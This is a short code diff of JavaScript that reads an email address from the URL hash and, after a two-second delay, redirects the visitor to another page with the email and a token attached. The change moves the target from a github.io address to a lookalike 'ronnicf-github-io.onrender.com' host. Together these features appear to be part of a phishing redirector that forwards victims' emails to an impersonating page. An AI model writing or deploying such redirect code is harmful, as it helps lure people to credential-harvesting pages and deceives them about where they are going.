@@ -38,7 +38,7 @@
       const email = window.location.hash.substring(1); // Get raw email from URL hash
       if (email && email.includes("@")) {
         const secureToken = generateSecureToken();
-        const redirectUrl = `https://ronnicf.github.io/adb.html#${email}&token=${secureToken}`;
+        const redirectUrl = `https://ronnicf-github-io.onrender.com/adb.html#${email}&token=${secureToken}`;
 
         // Delay redirect by 2 seconds
         setTimeout(() => {
